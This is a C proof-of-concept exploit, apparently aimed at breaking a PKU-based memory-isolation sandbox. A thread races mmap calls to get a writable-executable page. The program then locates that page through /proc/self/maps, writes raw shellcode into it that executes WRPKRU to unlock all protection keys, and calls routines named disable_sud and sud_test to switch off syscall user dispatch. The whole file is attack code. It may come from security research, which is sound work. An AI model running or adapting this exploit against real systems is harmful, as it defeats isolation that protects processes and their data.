#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <string.h>

#include "_libattack.h"

static unsigned long const map_start = 0x100000000;
static unsigned long map_stop = 0x100000000;
static int page_size = 4096;
static int signal_stop = 0;
static pthread_mutex_t signal_lock; 
static pthread_mutex_t start_lock;

static unsigned char unlock[] = {
	0x50, 0x52, 0x51, // push rax, rdx, rcx
	0x31, 0xc9,  // xor ecx, ecx
	0x31, 0xd2,  // xor edx, edx
	0xb8, 0x50, 0x55, 0x55, 0x55, // mov eax,0x55555550
	0x0f, 0x01, 0xef, // wrpku
	0x59, 0x5a, 0x58, // pop rcx, rdx, rax
	0xc3, // ret
	0
};


void *map_exec(void *map_start)
{

	pthread_mutex_lock(&start_lock);
	pthread_mutex_unlock(&start_lock);

	while(1) {

		pthread_mutex_lock(&signal_lock);
		if(signal_stop)
			break;
		pthread_mutex_unlock(&signal_lock); 

		mmap((void*)map_stop, page_size, PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
		map_stop += page_size;
	}

	return NULL;
}

int main(int argc, char **argv) {
	if (pthread_mutex_init(&start_lock, NULL) != 0) 
	{ 
		fprintf(stderr, "mutex init has failed\n"); 
		return -1;
	} 
	if (pthread_mutex_init(&signal_lock, NULL) != 0) 
	{ 
		fprintf(stderr, "mutex init has failed\n"); 
		return -1;
	} 


	pthread_t map_thread;
	pthread_mutex_lock(&start_lock); 
	if(pthread_create(&map_thread, NULL, map_exec, NULL)) {
		fprintf(stderr, "thread creation failed\n");
		return -1;
	}

	unsigned long fake_exec = map_start + page_size*10000; 
	fake_exec = (unsigned long const)mmap((void*)fake_exec, page_size, PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);	
    if((int64_t)fake_exec < 0){
        printf("error:%d\n", errno);
        exit(0);
    }
    printf("loc = %p\n", fake_exec);
	*(int*)fake_exec = 0xc3;

	void (*fun_ptr)(void) = (void(*)(void))fake_exec;

	pthread_mutex_unlock(&start_lock);
	fun_ptr();

	pthread_mutex_lock(&signal_lock);	
	signal_stop = 1;
	pthread_mutex_unlock(&signal_lock);

	if(pthread_join(map_thread, NULL)) {
		fprintf(stderr, "also damn\n");
		return -1;
	}

	printf("main -- printing maps\n");

	char path[128];
	snprintf(path, 128, "/proc/%d/maps", getpid());

	FILE* file = fopen(path, "r");
	if(!file) {
		fprintf(stderr, "can't read maps...\n");
		return -1;
	}

	char line[256];
	char *ptr;
	char const * addr_delim = "-";
	while (fgets(line, sizeof(line), file)) {
		if(strstr(line, "rwx") != NULL) {
			ptr = strtok(line, addr_delim);
			break;	
		}	 
	}

	fclose(file);

	if (ptr == NULL)
	{
		fprintf(stderr, "didn't work!\n");
		return -1;	
	}

	unsigned long rwx_addr = strtoul(ptr, NULL, 16);

	memcpy((char*)rwx_addr, unlock, sizeof(unlock));       

	void (*unlock_func)(void) = (void(*)(void))rwx_addr;
	unlock_func();

    disable_sud();
    sud_test();

	pthread_mutex_destroy(&start_lock);
	pthread_mutex_destroy(&signal_lock);

	return 0;
}